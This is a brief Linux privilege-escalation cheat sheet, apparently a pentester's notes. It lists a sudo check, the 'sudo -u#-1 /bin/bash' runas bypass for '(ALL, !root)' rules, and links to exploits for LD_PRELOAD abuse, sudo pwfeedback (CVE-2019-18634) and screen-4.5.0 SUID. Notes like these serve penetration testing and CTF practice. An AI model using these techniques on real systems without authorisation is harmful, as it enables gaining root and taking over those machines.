# Misconfigured sudo commands
## Checks
```
sudo -l
```
## Bypass (ALL, !root) /bin/bash ||| (ALL, !root) ALL
```
sudo -u#-1 /bin/bash
```
## Abuse env_keep+=LD_PRELOAD
```
https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
```
# Sudo vulns version
## Pwfeedback (CVE 2019-18634)
```
https://github.com/saleemrashid/sudo-cve-2019-18634
```

# Exotics SUID
## /usr/bin/screen-4.5.0
```
https://www.exploit-db.com/exploits/41154
```
